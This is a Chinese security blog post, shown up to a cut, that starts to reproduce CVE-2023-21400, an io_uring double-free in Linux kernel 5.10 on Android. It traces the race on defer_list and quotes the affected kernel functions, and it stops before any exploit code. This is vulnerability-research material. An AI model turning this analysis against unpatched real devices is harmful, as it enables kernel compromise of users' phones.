<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="韩乔落">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
        
        
        
    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://jelasin.github.io/2024/10/22/android安全-内核篇/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="会当身由己，婉转入江湖">
<meta property="og:type" content="article">
<meta property="og:title" content="Android安全-内核篇">
<meta property="og:url" content="https://jelasin.github.io/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/index.html">
<meta property="og:site_name" content="Jelasin">
<meta property="og:description" content="会当身由己，婉转入江湖">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://jelasin.github.io/images/touxiang.jpg">
<meta property="article:published_time" content="2024-10-22T07:21:46.000Z">
<meta property="article:modified_time" content="2025-12-24T07:42:49.439Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="AOSP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jelasin.github.io/images/touxiang.jpg">
    
    
        <!-- Google tag (gtag.js) -->
        <script src="https://www.googletagmanager.com/gtag/js?id=G-3333333333"></script>
        <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-3333333333');
        </script>
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/favicon.ico">
    <!--- Page Info-->
    
    <title>
        
            Android安全-内核篇 | Jelasin
        
    </title>

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fonts/Chillax/chillax.css">

    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/css/build/tailwind.css">
    

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fonts/GeistMono/geist-mono.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fonts/Geist/geist.css">
    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"jelasin.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":"Farsan","url":"https://fonts.googleapis.com/css2?family=Farsan&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":false,"site_uv":false,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/touxiang.jpg","description":"会当身由己，婉转入江湖"},"google_analytics":{"enable":true,"id":"G-3333333333"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"“会当身由己，婉转入江湖”","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":null,"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Links":{"icon":"fa-regular fa-link","submenus":{"github":"https://github.com/jelasin","看雪":"https://bbs.kanxue.com/homepage-958172.htm","吾爱破解":"https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space","中国诗歌网":"https://www.zgshige.com/c/2022-04-13/21151100.shtml"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"AI":{"path":"/AI","icon":"fa-brands fa-python"},"IOT":{"path":"/IOT","icon":"fas fa-network-wired"},"CTF":{"path":"/CTF","icon":"fa-solid fa-snowflake"},"Web":{"path":"/Web","icon":"fa-solid fa-shield"},"Linux":{"path":"/Linux","icon":"fa-brands fa-linux"},"Android":{"path":"/Android","icon":"fa-brands fa-android"},"Windows":{"path":"/Windows","icon":"fa-brands fa-windows"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":4},"tags":{"enable":true,"limit":4}},"footerStart":"2023/9/20 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fontawesome/fontawesome.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fontawesome/brands.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fontawesome/solid.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fontawesome/regular.min.css">
    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
                    <img src="/images/favicon.ico" class="w-full h-full rounded-xs">
                </a>
            
            <a class="logo-title" href="/">
                
                Jelasin
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-link fa-fw"></i>
                                    LINKS
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://github.com/jelasin">
                                                    GITHUB
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">
                                                    看雪
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">
                                                    吾爱破解
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">
                                                    中国诗歌网
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-Links"
                        >
                            <span>
                                LINKS
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-Links">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://github.com/jelasin">GITHUB</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">看雪</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">吾爱破解</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">中国诗歌网</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/categories"
                        >
                            <span>Categories</span>
                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/AI"
                        >
                            <span>AI</span>
                            <i class="fa-brands fa-python fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/IOT"
                        >
                            <span>IOT</span>
                            <i class="fas fa-network-wired fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/CTF"
                        >
                            <span>CTF</span>
                            <i class="fa-solid fa-snowflake fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Web"
                        >
                            <span>Web</span>
                            <i class="fa-solid fa-shield fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Linux"
                        >
                            <span>Linux</span>
                            <i class="fa-brands fa-linux fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Android"
                        >
                            <span>Android</span>
                            <i class="fa-brands fa-android fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Windows"
                        >
                            <span>Windows</span>
                            <i class="fa-brands fa-windows fa-sm fa-fw"></i>
                        </a>
                    </li>
                
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">39</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">125</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Android安全-内核篇</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/touxiang.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">韩乔落</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-10-22 15:21:46</span>
        <span class="mobile">2024-10-22 15:21:46</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-12-24 15:42:49</span>
            <span class="mobile">2025-12-24 15:42:49</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/Android/">Android</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/AOSP/">AOSP</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p><strong>启动命令</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">emulator \</span><br><span class="line">	-avd Pixel_API_24 \</span><br><span class="line">	-show-kernel \</span><br><span class="line">	-verbose \</span><br><span class="line">	-wipe-data \</span><br><span class="line">	-netfast \</span><br><span class="line">	-kernel <span class="built_in">arch</span>/x86_64/boot/bzImage \</span><br><span class="line">	-qemu \</span><br><span class="line">	-s</span><br></pre></td></tr></table></figure></div>

<h1 id="CVE-复现"><a href="#CVE-复现" class="headerlink" title="CVE 复现"></a>CVE 复现</h1><h2 id="CVE-2023-21400-Double-Free-DirtyPTE"><a href="#CVE-2023-21400-Double-Free-DirtyPTE" class="headerlink" title="CVE-2023-21400 - Double Free | DirtyPTE"></a>CVE-2023-21400 - Double Free | DirtyPTE</h2><p><code>CVE-2023-21400</code> 是 <code>io_uring</code> 中的 <code>Double-Free</code> 漏洞，影响内核 <code>5.10</code>。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在<code>io_uring</code>中，当我们提交<code>IOSQE_IO_DRAIN</code>请求时，在之前提交的请求完成前，不会启动该请求。因此，推迟处理该请求，将该请求添加到<code>io_ring_ctx-&gt;defer_list</code>双链表中（<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.10.100/source/fs/io_uring.c#L707" >io_defer_entry<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 对象）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241211175207586.png"
                      alt="image-20241211175207586"
                ></p>
<p><strong>竞争访问1-漏洞对象取出</strong>：之前提交的请求完成以后，就会<strong>将推迟的请求（<code>io_defer_entry</code>对象）从<code>defer_list</code>中删除</strong>。由于可以并发访问<code>defer_list</code>，所以访问<code>defer_list</code>时必须加上自旋锁。但是，有一种情况是在没有<code>completion_lock</code> spinlock保护的情况下访问的<code>defer_list</code>。在<code>io_uring</code>中启用了<code>IORING_SETUP_IOPOLL</code>时，可以通过调用 <code>io_uring_enter(IORING_ENTER_GETEVENTS)</code>来获取事件完成情况，所触发的调用链为 <code>io_uring_enter()-&gt;io_iopoll_check()-&gt;io_iopoll_getevents()-&gt;io_do_iopoll()-&gt;io_iopoll_complete()-&gt;io_commit_cqring()-&gt;__io_queue_deferred()</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// __io_queue_deferred() —— 从`ctx-&gt;defer_list`取出延迟的请求</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __io_queue_deferred(<span class="keyword">struct</span> io_ring_ctx *ctx)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">io_defer_entry</span> *<span class="title">de</span> =</span> list_first_entry(&amp;ctx-&gt;defer_list, <span class="comment">// 从`ctx-&gt;defer_list`获取`io_defer_entry`对象</span></span><br><span class="line">                        <span class="keyword">struct</span> io_defer_entry, <span class="built_in">list</span>);</span><br><span class="line">        <span class="keyword">if</span> (req_need_defer(de-&gt;req, de-&gt;seq))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        list_del_init(&amp;de-&gt;<span class="built_in">list</span>);</span><br><span class="line">        io_req_task_queue(de-&gt;req); 	<span class="comment">// 对应的请求将排队等候 task_work_run()</span></span><br><span class="line">        kfree(de);</span><br><span class="line">    &#125; <span class="keyword">while</span> (!list_empty(&amp;ctx-&gt;defer_list));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>竞争访问2</strong>：以上函数访问<code>ctx-&gt;defer_list</code>时没有获取<code>ctx-&gt;completion_lock</code>锁，可能导致竞争条件漏洞。因为除了<code>__io_queue_deferred()</code>函数，<code>io_cancel_defer_files()</code>函数也可以处理<code>ctx-&gt;defer_list</code>：</p>
<p><code>io_cancel_defer_files()</code>函数有两条触发路径：</p>
<ul>
<li><code>do_exit()-&gt;io_uring_files_cancel()-&gt;__io_uring_files_cancel()-&gt;io_uring_cancel_task_requests()-&gt;io_cancel_defer_files()</code></li>
<li><code>execve()-&gt;do_execve()-&gt;do_execveat_common()-&gt;bprm_execve()-&gt;io_uring_task_cancel()-&gt;__io_uring_task_cancel()-&gt;__io_uring_files_cancel()-&gt;io_uring_cancel_task_requests()-&gt;io_cancel_defer_files()</code> —— 这种方式不需要退出当前任务，因此更加可控。可选择这种方式来触发。</li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">io_cancel_defer_files</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx,</span></span><br><span class="line"><span class="params">                  <span class="keyword">struct</span> task_struct *task,</span></span><br><span class="line"><span class="params">                  <span class="keyword">struct</span> files_struct *files)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_defer_entry</span> *<span class="title">de</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    LIST_HEAD(<span class="built_in">list</span>);</span><br><span class="line">    spin_lock_irq(&amp;ctx-&gt;completion_lock);</span><br><span class="line">    list_for_each_entry_reverse(de, &amp;ctx-&gt;defer_list, <span class="built_in">list</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (io_match_task(de-&gt;req, task, files)) &#123;</span><br><span class="line">            list_cut_position(&amp;<span class="built_in">list</span>, &amp;ctx-&gt;defer_list, &amp;de-&gt;<span class="built_in">list</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;ctx-&gt;completion_lock);</span><br><span class="line">    <span class="keyword">while</span> (!list_empty(&amp;<span class="built_in">list</span>)) &#123;</span><br><span class="line">        de = list_first_entry(&amp;<span class="built_in">list</span>, <span class="keyword">struct</span> io_defer_entry, <span class="built_in">list</span>);</span><br><span class="line">        list_del_init(&amp;de-&gt;<span class="built_in">list</span>);</span><br><span class="line">        req_set_fail_links(de-&gt;req);</span><br><span class="line">        io_put_req(de-&gt;req);</span><br><span class="line">        io_req_complete(de-&gt;req, -ECANCELED);</span><br><span class="line">        kfree(de);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>构造竞争</strong>：通过以下代码来构造竞争，同时处理<code>ctx-&gt;defer_list</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
